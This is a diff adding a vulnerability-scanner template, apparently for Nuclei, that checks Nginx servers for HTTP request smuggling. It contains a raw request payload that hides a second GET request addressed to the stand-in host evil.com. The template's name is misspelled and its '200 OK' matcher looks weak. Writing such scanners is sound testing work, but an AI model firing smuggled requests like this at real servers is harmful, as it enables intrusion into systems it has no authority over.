@@ -1,0 +1,23 @@
+id: ngnix_requests_smuggling
+
+info:
+  name: Ngnix has vulnerable to request smuggling attack
+  author: abdulrahman
+  severity: high
+
+requests:
+   - raw:
+      - |
+       GET /a HTTP/1.1
+       Host: {{Hostname}}
+       Content-Length: 56
+
+       GET / HTTP/1.1
+       Host: evil.com
+
+     matchers:
+       - type: word
+         part: body
+         words:
+           - "200 OK"
+
